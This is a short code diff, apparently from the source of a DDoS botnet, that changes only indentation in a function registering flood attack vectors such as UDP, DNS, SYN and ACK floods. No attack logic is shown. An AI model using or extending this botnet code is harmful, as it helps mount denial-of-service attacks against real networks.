@@ -26,7 +26,7 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_UDP, (ATTACK_FUNC)attack_udp_generic);
     add_attack(ATK_VEC_VSE, (ATTACK_FUNC)attack_udp_vse);
     add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_udp_dns);
-	add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);
+    add_attack(ATK_VEC_UDP_PLAIN, (ATTACK_FUNC)attack_udp_plain);
 
     add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
     add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_tcp_ack);
